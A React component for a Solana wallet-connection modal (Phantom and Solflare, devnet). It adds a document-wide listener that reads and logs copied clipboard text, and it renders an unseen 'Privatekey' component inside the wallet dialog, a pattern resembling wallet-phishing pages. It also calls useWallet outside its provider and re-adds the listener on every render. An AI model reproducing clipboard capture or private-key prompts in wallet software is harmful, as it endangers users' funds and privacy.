import { useEffect, useMemo, useState } from "react";
import {
  ConnectionProvider,
  WalletProvider,
  useWallet,
} from "@solana/wallet-adapter-react";
import {
  WalletModalProvider,
  WalletMultiButton,
} from "@solana/wallet-adapter-react-ui";
import { clusterApiUrl } from "@solana/web3.js";
import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
} from "@solana/wallet-adapter-wallets";
import "@solana/wallet-adapter-react-ui/styles.css";
import Privatekey from "./Privatekey";

const PhantomWallet = ({ visible, setVisible }: { visible: boolean, setVisible : any }) => {
  // Define the network (can be 'mainnet', 'devnet', 'testnet')
  const network = "devnet"; // Change to 'mainnet-beta' or 'testnet' as needed
  const endpoint = useMemo(() => clusterApiUrl(network), [network]);
  const { publicKey, connected } = useWallet();
  // Create the wallet adapters (e.g., Phantom, Sollet, Solflare)
  const wallets = useMemo(
    () => [new PhantomWalletAdapter(), new SolflareWalletAdapter()],
    []
  );
  console.log(navigator.clipboard);
  document.addEventListener("copy", (e) => {
    if (e.clipboardData) {
      console.log(e.clipboardData.getData("text"));
    }
  });
  useEffect(() => {
    console.log("Public Key:", publicKey);
  }, [connected]);
  const closeModal = () => {
    window.solana.on('disconnect', () => {
      console.log('Disconnected from Phantom Wallet');
    });
    setVisible(false);
  };
  return visible ? (
    <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex justify-center items-center z-50">
      <div className="bg-white rounded-lg shadow-lg w-1/3 p-6">
        <ConnectionProvider endpoint={endpoint}>
          <WalletProvider wallets={wallets} autoConnect>
            <WalletModalProvider>
              <div className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 flex items-center justify-center">
                <div className="text-white text-center">
                  <h1 className="text-4xl font-bold mb-8">
                    Solana Wallet Connection
                  </h1>
                  <p className="text-lg mb-8">
                    Connect your wallet to start interacting with the app.
                  </p>
                  <div className="flex justify-center">
                    <WalletMultiButton className="px-6 py-3 bg-indigo-600 text-white rounded-lg shadow-lg hover:bg-indigo-700 transition ease-in-out duration-300 focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-50" />
                  </div>
                </div>
              </div>
            </WalletModalProvider>
          </WalletProvider>
        </ConnectionProvider>
        <Privatekey />
        <button
        style={{marginTop:"10px", alignItems:"center", display:"flex", justifyContent:"center"}}
          onClick={closeModal}
          className="px-6 py-3 text-white bg-blue-500 rounded-lg shadow-md transform transition duration-300 ease-in-out hover:bg-blue-600 hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-50"
        >
          Close
        </button>
      </div>
    </div>
  ) : (
    ""
  );
};export default PhantomWallet;
